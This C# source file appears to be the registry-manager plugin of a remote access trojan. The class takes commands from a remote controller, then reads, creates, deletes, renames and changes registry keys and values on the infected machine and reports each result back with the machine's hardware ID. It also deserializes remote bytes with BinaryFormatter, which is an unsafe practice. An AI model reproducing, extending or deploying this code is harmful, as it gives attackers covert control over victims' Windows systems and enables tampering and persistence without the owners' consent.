using System;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using MessagePackLib.MessagePack;
using Microsoft.Win32;
using ProtoBuf;
using static Plugin.Handler.RegistrySeeker;

namespace Plugin.Handler
{
    public class RegManager
    {
        public RegManager(MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "LoadRegistryKey":
                    {
                        var RootKeyName = unpack_msgpack.ForcePathObject("RootKeyName").AsString;
                        LoadKey(RootKeyName);
                        break;
                    }
                    case "CreateRegistryKey":
                    {
                        var ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                        CreateKey(ParentPath);
                        break;
                    }
                    case "DeleteRegistryKey":
                    {
                        var KeyName = unpack_msgpack.ForcePathObject("KeyName").AsString;
                        var ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                        DeleteKey(KeyName, ParentPath);
                        break;
                    }
                    case "RenameRegistryKey":
                    {
                        var OldKeyName = unpack_msgpack.ForcePathObject("OldKeyName").AsString;
                        var NewKeyName = unpack_msgpack.ForcePathObject("NewKeyName").AsString;
                        var ParentPath = unpack_msgpack.ForcePathObject("ParentPath").AsString;
                        RenameKey(OldKeyName, NewKeyName, ParentPath);
                        break;
                    }
                    case "CreateRegistryValue":
                    {
                        var KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                        var Kindstring = unpack_msgpack.ForcePathObject("Kindstring").AsString;
                        CreateValue(KeyPath, Kindstring);
                        break;
                    }
                    case "DeleteRegistryValue":
                    {
                        var KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                        var ValueName = unpack_msgpack.ForcePathObject("ValueName").AsString;
                        DeleteValue(KeyPath, ValueName);
                        break;
                    }
                    case "RenameRegistryValue":
                    {
                        var OldValueName = unpack_msgpack.ForcePathObject("OldValueName").AsString;
                        var NewValueName = unpack_msgpack.ForcePathObject("NewValueName").AsString;
                        var KeyPath = unpack_msgpack.ForcePathObject("KeyPath").AsString;
                        RenameValue(OldValueName, NewValueName, KeyPath);
                        break;
                    }
                    case "ChangeRegistryValue":
                    {
                        var Valuebyte = unpack_msgpack.ForcePathObject("Value").GetAsBytes();
                        var formatter = new BinaryFormatter();
                        var mStream = new MemoryStream();
                        mStream.Write(Valuebyte, 0, Valuebyte.Length);
                        mStream.Flush();
                        mStream.Seek(0, SeekOrigin.Begin);
                        var Value = (RegValueData)formatter.Deserialize(mStream);
                        ChangeValue(Value, unpack_msgpack.ForcePathObject("KeyPath").AsString);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }


        public static byte[] Serialize(RegSeekerMatch[] Matches)
        {
            using (var ms = new MemoryStream())
            {
                Serializer.Serialize(ms, Matches);
                return ms.ToArray();
            }
        }

        public static byte[] Serialize(RegSeekerMatch Matche)
        {
            using (var ms = new MemoryStream())
            {
                Serializer.Serialize(ms, Matche);
                return ms.ToArray();
            }
        }

        public static byte[] Serialize(RegValueData Value)
        {
            using (var ms = new MemoryStream())
            {
                Serializer.Serialize(ms, Value);
                return ms.ToArray();
            }
        }


        public void LoadKey(string RootKeyName)
        {
            try
            {
                var seeker = new RegistrySeeker();
                seeker.BeginSeeking(RootKeyName);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "LoadKey";
                msgpack.ForcePathObject("RootKey").AsString = RootKeyName;
                msgpack.ForcePathObject("Matches").SetAsBytes(Serialize(seeker.Matches));
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }


        public void CreateKey(string ParentPath)
        {
            string errorMsg;
            var newKeyName = "";
            try
            {
                RegistryEditor.CreateRegistryKey(ParentPath, out newKeyName, out errorMsg);
                var Match = new RegSeekerMatch
                {
                    Key = newKeyName,
                    Data = RegistryKeyHelper.GetDefaultValues(),
                    HasSubKeys = false
                };

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "CreateKey";
                msgpack.ForcePathObject("ParentPath").AsString = ParentPath;
                msgpack.ForcePathObject("Match").SetAsBytes(Serialize(Match));
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public void DeleteKey(string KeyName, string ParentPath)
        {
            string errorMsg;
            try
            {
                RegistryEditor.DeleteRegistryKey(KeyName, ParentPath, out errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "DeleteKey";
                msgpack.ForcePathObject("ParentPath").AsString = ParentPath;
                msgpack.ForcePathObject("KeyName").AsString = KeyName;
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public void RenameKey(string OldKeyName, string NewKeyName, string ParentPath)
        {
            string errorMsg;
            try
            {
                RegistryEditor.RenameRegistryKey(OldKeyName, NewKeyName, ParentPath, out errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "RenameKey";
                msgpack.ForcePathObject("rootKey").AsString = ParentPath;
                msgpack.ForcePathObject("oldName").AsString = OldKeyName;
                msgpack.ForcePathObject("newName").AsString = NewKeyName;
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public void CreateValue(string KeyPath, string Kindstring)
        {
            string errorMsg;
            var newKeyName = "";
            var Kind = RegistryValueKind.None;
            switch (Kindstring)
            {
                case "-1":
                {
                    Kind = RegistryValueKind.None;
                    break;
                }
                case "0":
                {
                    Kind = RegistryValueKind.Unknown;
                    break;
                }
                case "1":
                {
                    Kind = RegistryValueKind.String;
                    break;
                }
                case "2":
                {
                    Kind = RegistryValueKind.ExpandString;
                    break;
                }
                case "3":
                {
                    Kind = RegistryValueKind.Binary;
                    break;
                }
                case "4":
                {
                    Kind = RegistryValueKind.DWord;
                    break;
                }
                case "7":
                {
                    Kind = RegistryValueKind.MultiString;
                    break;
                }
                case "11":
                {
                    Kind = RegistryValueKind.QWord;
                    break;
                }
            }

            try
            {
                RegistryEditor.CreateRegistryValue(KeyPath, Kind, out newKeyName, out errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "CreateValue";
                msgpack.ForcePathObject("keyPath").AsString = KeyPath;
                msgpack.ForcePathObject("Kindstring").AsString = Kindstring;
                msgpack.ForcePathObject("newKeyName").AsString = newKeyName;
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public void DeleteValue(string KeyPath, string ValueName)
        {
            string errorMsg;
            try
            {
                RegistryEditor.DeleteRegistryValue(KeyPath, ValueName, out errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "DeleteValue";
                msgpack.ForcePathObject("keyPath").AsString = KeyPath;
                msgpack.ForcePathObject("ValueName").AsString = ValueName;
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public void RenameValue(string OldValueName, string NewValueName, string KeyPath)
        {
            string errorMsg;
            try
            {
                RegistryEditor.RenameRegistryValue(OldValueName, NewValueName, KeyPath, out errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "RenameValue";
                msgpack.ForcePathObject("KeyPath").AsString = KeyPath;
                msgpack.ForcePathObject("OldValueName").AsString = OldValueName;
                msgpack.ForcePathObject("NewValueName").AsString = NewValueName;
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        public void ChangeValue(RegValueData Value, string KeyPath)
        {
            string errorMsg;
            try
            {
                RegistryEditor.ChangeRegistryValue(Value, KeyPath, out errorMsg);

                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "regManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "ChangeValue";
                msgpack.ForcePathObject("KeyPath").AsString = KeyPath;
                msgpack.ForcePathObject("Value").SetAsBytes(Serialize(Value));
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        [ProtoContract]
        public class GetRegistryKeysResponse
        {
            [ProtoMember(1)] public RegSeekerMatch[] Matches { get; set; }

            [ProtoMember(2)] public string RootKey { get; set; }

            [ProtoMember(3)] public bool IsError { get; set; }

            [ProtoMember(4)] public string ErrorMsg { get; set; }
        }
    }
}